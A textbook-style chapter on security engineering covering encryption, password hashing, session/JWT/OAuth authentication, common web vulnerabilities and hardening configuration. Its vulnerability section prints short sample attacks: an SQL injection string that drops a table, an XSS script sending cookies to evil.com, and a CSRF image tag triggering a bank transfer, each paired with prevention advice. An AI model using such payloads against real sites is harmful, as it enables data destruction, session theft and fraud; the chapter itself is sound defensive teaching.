# Chapter 08: Security Engineering

> "Security is not a product, but a process." - Bruce Schneier

---

## 🔐 Cryptography Fundamentals

### Symmetric vs Asymmetric Encryption

```
Symmetric (Same key for encrypt/decrypt):
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Plaintext ──► [AES Key] ──► Ciphertext ──► [AES Key] ──► Plaintext
│                    │                            │           │
│                    └──── Same key ──────────────┘           │
│                                                             │
│  Algorithms: AES, ChaCha20                                  │
│  Fast, used for bulk encryption                             │
│  Problem: How to share the key securely?                    │
└─────────────────────────────────────────────────────────────┘

Asymmetric (Different keys):
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Plaintext ──► [Public Key] ──► Ciphertext ──► [Private Key] ──► Plaintext
│                                                             │
│  Algorithms: RSA, ECDSA, Ed25519                            │
│  Slow, used for key exchange and signing                    │
│  Public key: Share freely                                   │
│  Private key: Keep secret                                   │
└─────────────────────────────────────────────────────────────┘
```

### Hashing

```
Input (any size) ──► Hash Function ──► Fixed-size output

"Hello" ──► SHA-256 ──► 185f8db32271fe25f561a6fc938b2e26...
"Hello!" ──► SHA-256 ──► 33b9c950a9c0c4e7d569f0cc6a0c76cb... (completely different!)

Properties:
1. Deterministic (same input = same output)
2. One-way (can't reverse)
3. Collision-resistant (hard to find two inputs with same hash)
4. Avalanche effect (small change = big difference)

Common algorithms:
- MD5: Broken, don't use for security
- SHA-1: Deprecated
- SHA-256: Current standard
- SHA-3: Newest standard
- bcrypt/argon2: For passwords (intentionally slow)
```

### Password Storage

```
WRONG:
passwords_table:
│ user_id │ password    │
├─────────┼─────────────┤
│ 1       │ mypassword  │  ← Plaintext! Disaster if leaked

WRONG:
│ user_id │ password_hash                                    │
├─────────┼──────────────────────────────────────────────────┤
│ 1       │ 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)          │
                         ↑ Can be reversed with rainbow tables

RIGHT:
│ user_id │ password_hash                                    │
├─────────┼──────────────────────────────────────────────────┤
│ 1       │ $argon2id$v=19$m=65536,t=3,p=4$salt$hash        │
                         ↑ Salted + slow algorithm

Code:
```

```javascript
// Using argon2 (recommended)
const argon2 = require('argon2');

// Hashing
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,    // 64 MB
  timeCost: 3,          // iterations
  parallelism: 4        // threads
});

// Verifying
const valid = await argon2.verify(hash, password);

// Using bcrypt (also good)
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);  // 12 rounds
const valid = await bcrypt.compare(password, hash);
```

---

## 🔑 Authentication Patterns

### Session-Based Authentication

```
┌──────────┐    1. Login         ┌──────────┐
│  Client  │ ──────────────────► │  Server  │
│          │    (user/pass)      │          │
│          │                     │          │
│          │    2. Create        │          │
│          │    session in DB    │    ┌─────┴─────┐
│          │                     │    │ Sessions  │
│          │                     │    │ DB/Redis  │
│          │    3. Set cookie    │    └───────────┘
│          │ ◄─────────────────  │          │
│  Cookie: │    (session_id)     │          │
│  sess=X  │                     │          │
│          │    4. Requests      │          │
│          │ ──────────────────► │          │
│          │    (Cookie: sess=X) │          │
│          │                     │          │
│          │    5. Verify        │          │
│          │    (lookup session) │          │
└──────────┘                     └──────────┘

Pros: Easy to revoke, server controls state
Cons: Requires session storage, not stateless
```

### Token-Based (JWT)

```
┌──────────┐    1. Login         ┌──────────┐
│  Client  │ ──────────────────► │  Server  │
│          │    (user/pass)      │          │
│          │                     │          │
│          │    2. Generate JWT  │          │
│          │ ◄─────────────────  │          │
│ Storage: │    (token)          │          │
│ token=Y  │                     │          │
│          │                     │          │
│          │    3. Requests      │          │
│          │ ──────────────────► │          │
│          │  (Authorization:    │          │
│          │   Bearer Y)         │          │
│          │                     │          │
│          │    4. Verify JWT    │          │
│          │    (signature)      │          │
└──────────┘                     └──────────┘

JWT Structure:
header.payload.signature

{                           {                      HMAC-SHA256(
  "alg": "HS256",            "sub": "user123",       base64(header) + "." +
  "typ": "JWT"               "name": "John",         base64(payload),
}                            "exp": 1234567890       secret
                           }                       )

Pros: Stateless, scalable, works across domains
Cons: Can't revoke (until expiry), larger than session ID
```

### OAuth 2.0 Flows

```
Authorization Code Flow (Most secure, for server apps):

┌────────┐                ┌─────────────┐                ┌─────────────┐
│  User  │                │   Your App  │                │Auth Provider│
│        │                │  (Backend)  │                │  (Google)   │
└───┬────┘                └──────┬──────┘                └──────┬──────┘
    │  1. Click "Login           │                              │
    │     with Google"           │                              │
    │ ──────────────────────────►│                              │
    │                            │  2. Redirect to Google       │
    │ ◄──────────────────────────│──────────────────────────────►
    │                            │                              │
    │  3. User logs in           │                              │
    │     and approves           │                              │
    │ ─────────────────────────────────────────────────────────►│
    │                            │                              │
    │  4. Redirect with          │                              │
    │     auth code              │                              │
    │ ◄─────────────────────────────────────────────────────────│
    │ ──────────────────────────►│                              │
    │                            │  5. Exchange code            │
    │                            │     for tokens               │
    │                            │ ─────────────────────────────►
    │                            │                              │
    │                            │  6. Access + Refresh         │
    │                            │     tokens                   │
    │                            │ ◄─────────────────────────────
    │                            │                              │
    │  7. User logged in         │                              │
    │ ◄──────────────────────────│                              │
```

### API Key Authentication

```
Simple but limited:

curl -H "X-API-Key: abc123" https://api.example.com/data

Pros: Simple to implement
Cons: 
- No user context
- Hard to rotate
- Should be combined with other auth
- Use for server-to-server, not user auth
```

---

## 🛡️ Common Vulnerabilities

### SQL Injection

```
Vulnerable code:
const query = `SELECT * FROM users WHERE email = '${email}'`;

Attack:
email = "'; DROP TABLE users; --"
Result: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

Prevention:
1. Parameterized queries (ALWAYS)
   const result = await db.query(
     'SELECT * FROM users WHERE email = $1',
     [email]
   );

2. ORM with proper escaping
   const user = await User.findOne({ where: { email } });
```

### XSS (Cross-Site Scripting)

```
Stored XSS:
Attacker posts: <script>document.location='http://evil.com/steal?'+document.cookie</script>
Other users load page → script executes → cookies stolen

Reflected XSS:
URL: https://example.com/search?q=<script>alert('xss')</script>
Page renders search term without escaping → script executes

Prevention:
1. Escape output (HTML entities)
   < becomes &lt;
   > becomes &gt;
   
2. Content Security Policy (CSP)
   Content-Security-Policy: script-src 'self'
   
3. HttpOnly cookies (JS can't access)
   Set-Cookie: session=abc; HttpOnly; Secure

4. Use framework's auto-escaping
   React: {userInput}  // Auto-escaped
   Vue: {{ userInput }} // Auto-escaped
```

### CSRF (Cross-Site Request Forgery)

```
Attack scenario:
1. User logged into bank.com
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request with user's cookies
5. Money transferred!

Prevention:
1. CSRF tokens
   <form>
     <input type="hidden" name="_csrf" value="random_token">
   </form>
   Server validates token matches session

2. SameSite cookies
   Set-Cookie: session=abc; SameSite=Strict

3. Check Origin/Referer header
```

### IDOR (Insecure Direct Object Reference)

```
Vulnerable:
GET /api/users/123/documents
Attacker changes to:
GET /api/users/456/documents  → Gets other user's documents!

Prevention:
// Always check ownership
async function getDocuments(req, res) {
  const { userId } = req.params;
  
  // Check that requesting user owns this resource
  if (req.user.id !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Or better: only fetch user's own documents
  const docs = await Document.find({ ownerId: req.user.id });
}
```

---

## 🏰 Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│                     Layer 1: Edge/CDN                           │
│            DDoS protection, WAF, rate limiting                  │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 2: Load Balancer                      │
│            SSL termination, request filtering                   │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 3: API Gateway                        │
│            Authentication, rate limiting, logging               │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 4: Application                        │
│            Input validation, authorization, business logic      │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 5: Database                           │
│            Encryption at rest, access controls, audit logs      │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 6: Network                            │
│            VPC, security groups, private subnets                │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔒 Security Best Practices

### Input Validation

```javascript
// ALWAYS validate and sanitize input

// Using zod
import { z } from 'zod';

const UserSchema = z.object({
  email: z.string().email().max(255),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150),
});

// Validate
const result = UserSchema.safeParse(input);
if (!result.success) {
  return res.status(400).json({ errors: result.error.issues });
}

// Sanitize HTML (if needed)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);
```

### Secrets Management

```
WRONG:
// Hardcoded in code
const API_KEY = 'sk-1234567890';

// In git
.env
API_KEY=sk-1234567890

RIGHT:
// Environment variables (not in git)
const API_KEY = process.env.API_KEY;

// Secret manager (production)
const secret = await secretManager.getSecret('api-key');

// Vault (enterprise)
const secret = await vault.read('secret/data/api-key');

Best practices:
1. Never commit secrets to git
2. Use different secrets per environment
3. Rotate secrets regularly
4. Use short-lived credentials when possible
5. Audit secret access
```

### Security Headers

```javascript
// Using helmet.js
const helmet = require('helmet');
app.use(helmet());

// Or manually:
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Enable XSS filter
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // HTTPS only
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // Content Security Policy
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  
  next();
});
```

### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: 'Too many requests'
});

// Strict limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // 5 attempts
  message: 'Too many login attempts'
});

app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
```

---

## 🔐 HTTPS/TLS Configuration

```nginx
# Nginx TLS configuration

server {
    listen 443 ssl http2;
    server_name example.com;
    
    # Certificates
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # Modern TLS only
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Strong cipher suites
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    
    # Session resumption
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=63072000" always;
}
```

---

## 📝 Security Checklist

```
Authentication:
□ Strong password policy (12+ chars, complexity)
□ Account lockout after failed attempts
□ Secure password reset flow
□ MFA for sensitive operations
□ Session timeout and invalidation

Authorization:
□ Principle of least privilege
□ Role-based access control
□ Resource ownership checks
□ API endpoint authorization

Data Protection:
□ Encryption at rest (database, files)
□ Encryption in transit (TLS everywhere)
□ PII handling compliance (GDPR, etc.)
□ Secure data deletion

Infrastructure:
□ Firewall rules (minimal access)
□ Private networks for databases
□ Regular security updates
□ Intrusion detection
□ DDoS protection

Monitoring:
□ Security logging (auth events, errors)
□ Alerting on anomalies
□ Regular security audits
□ Penetration testing
```

---

## 📖 Further Reading

- OWASP Top 10
- "The Web Application Hacker's Handbook"
- "Cryptography Engineering" by Schneier
- NIST Cybersecurity Framework

---

**Next:** [Chapter 09: Observability →](./09-observability.md)


